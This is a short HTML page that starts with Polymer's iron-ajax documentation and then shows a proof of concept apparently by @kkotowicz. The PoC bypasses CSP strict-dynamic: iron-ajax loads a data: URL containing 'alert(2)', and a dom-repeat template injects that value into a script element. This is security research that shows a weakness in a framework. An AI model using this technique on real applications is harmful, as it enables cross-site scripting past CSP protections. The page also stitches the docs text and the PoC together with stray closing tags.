The `iron-ajax` element exposes network request functionality.

    <iron-ajax
        auto
        url="https://www.googleapis.com/youtube/v3/search"
        params='{"part":"snippet", "q":"polymer", "key": "YOUTUBE_API_KEY", "type": "video"}'
        handle-as="json"
        on-response="handleResponse"
        debounce-duration="300"></iron-ajax>

With `auto` set to `true`, the element performs a request whenever
its `url`, `params` or `body` properties are changed. Automatically generated
requests will be debounced in the case that multiple attributes are changed
sequentially.

Note: The `params` attribute must be double quoted JSON.

You can trigger a request explicitly by calling `generateRequest` on the
element.

  </p><h2>CSP strict-dynamic bypass by @kkotowicz</h2>
  <h3>via Polymer iron-ajax</h3>
  <p>Just like <a href="poc.vulcanized.html">here</a> &lt;iron-ajax&gt; is vulnerable as well, but actually the core issue is that template with script elements will be created by document.createElement, making it a strict-dynamic bypass.

  No idea how applicable that one is in real Polymer apps, might be bogus.
   <dom-module id="x-foo">

	<!-- XSS -->
  <template>
        <iron-ajax auto="" url="data:,[&quot;alert(2)&quot;]" handle-as="json" last-response="{{ajaxResponse}}"></iron-ajax>
        <template is="dom-repeat" items="[[ajaxResponse]]">
            <!-- duh. script would be picked up by vulcanizer or crisper -->
            <!-- replace ssssss with script in the vulcanized file to simulate a reflected xss -->
            <script>{{item}}</script>
        </template>
  </template>
  <!--/XSS-->

  </dom-module>
<x-foo>



</x-foo></p></body></html>
